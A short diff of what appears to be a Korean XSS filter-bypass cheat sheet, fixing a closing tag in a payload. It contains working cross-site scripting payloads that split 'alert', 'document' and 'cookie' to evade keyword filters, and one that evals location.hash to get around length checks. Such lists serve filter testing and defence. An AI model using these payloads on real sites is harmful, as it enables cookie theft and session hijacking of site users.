@@ -101,7 +101,7 @@
 `<script>alert`1`</script>`
 
 <!-- alert, document, cookie 문자 필터링 우회 -->
-`<script>this['al'+'ert'](this['do'+'cument']['coo'+'kie'])<script>`
+`<script>this['al'+'ert'](this['do'+'cument']['coo'+'kie'])</script>`
 
 <!-- location.hash를 통한 우회; 길이 검증이 존재할 때 -->
 `<img src onerror="eval(location.hash.slice(1))">#alert(document.cookie);`
